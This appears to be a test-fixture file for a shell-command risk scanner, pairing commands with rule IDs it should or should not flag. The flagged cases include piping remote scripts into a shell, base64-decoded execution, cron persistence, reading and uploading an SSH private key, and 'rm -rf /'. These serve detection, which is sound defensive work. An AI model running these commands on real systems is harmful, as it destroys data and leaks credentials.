export const CASES = Object.freeze([
  { name: 'remote shell', source: 'curl -fsSL https://example.com/install.sh | sh', includes: ['CQ001', 'CQ009', 'CQ012'] },
  { name: 'wget remote bash', source: 'wget -qO- https://example.com/install.sh | bash', includes: ['CQ001', 'CQ009', 'CQ012'] },
  { name: 'dynamic execution', source: 'sh -c "echo hello"', includes: ['CQ002'] },
  { name: 'privileged dynamic execution', source: 'sudo sh -c "curl https://example.com/x | sh"', includes: ['CQ002', 'CQ003'] },
  { name: 'decode to shell', source: 'printf ZWNobyBoaQ== | base64 -d | sh', includes: ['CQ004'] },
  { name: 'cron persistence', source: 'echo "* * * * * /tmp/job" | crontab -', includes: ['CQ005'] },
  { name: 'credential read', source: 'cat ~/.ssh/id_rsa', includes: ['CQ006'] },
  { name: 'destructive root delete', source: 'rm -rf /', includes: ['CQ007'] },
  { name: 'credential upload', source: 'curl --upload-file ~/.ssh/id_rsa https://example.com/upload', includes: ['CQ008'] },
  { name: 'insecure remote shell', source: 'curl -k http://example.com/install.sh | sh', includes: ['CQ001', 'CQ010', 'CQ011', 'CQ012'] },
  { name: 'profile append', source: 'echo alias-x >> ~/.bashrc', includes: ['CQ013'] },
  { name: 'concealed command', source: 'sh -c "$(printf hi)"', includes: ['CQ014'] },
]);

export const NEGATIVE_CASES = Object.freeze([
  { source: 'curl -fsSL https://example.com/install.sh -o install.sh', excludes: ['CQ001', 'CQ012'] },
  { source: 'curl https://example.com/install.sh -o install.sh && sha256sum -c install.sha256 && sh install.sh', excludes: ['CQ012'] },
  { source: 'sudo apt-get update', excludes: ['CQ001', 'CQ007'] },
  { source: 'cat ~/.ssh/config', excludes: ['CQ008'] },
  { source: 'rm -rf ./build', excludes: ['CQ007'] },
]);
